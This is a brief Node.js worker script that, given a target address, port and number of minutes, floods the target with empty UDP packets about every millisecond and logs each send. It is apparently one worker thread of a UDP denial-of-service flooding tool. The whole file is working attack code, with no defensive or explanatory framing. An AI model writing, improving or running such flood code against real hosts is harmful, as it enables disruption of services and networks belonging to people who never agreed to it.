const { parentPort } = require('worker_threads');

parentPort.on('message', async ({ address, port, time, thread }) => {
  const dgram = require('dgram');
  const client = dgram.createSocket('udp4');

  let task = null;

  setTimeout(() => {
    task = setInterval(() => {
      client.send('', port, address, (error) => {
        if (error) {
          console.log('\x1b[31m%s\x1b[0m', `[ERROR #${thread}] Can't send packet to ${address}:${port} [${error}]`)
          clearInterval(task);
          console.log('\x1b[31m%s\x1b[0m', `[uddps #${thread}] Stopped!`)
          return;
        }
        console.log('\x1b[31m%s\x1b[0m', `[udpps #${thread}] Sending to ${address}:${port}...`)
      });

    }, 1)
  }, 3000)

  setTimeout(() => {
    clearInterval(task);
    console.log('\x1b[31m%s\x1b[0m', `[udpps #${thread}] Stopped!`)
  }, 1000 * 60 * time);

  console.log('\x1b[31m%s\x1b[0m', `[udpps #${thread}] Started!`)
});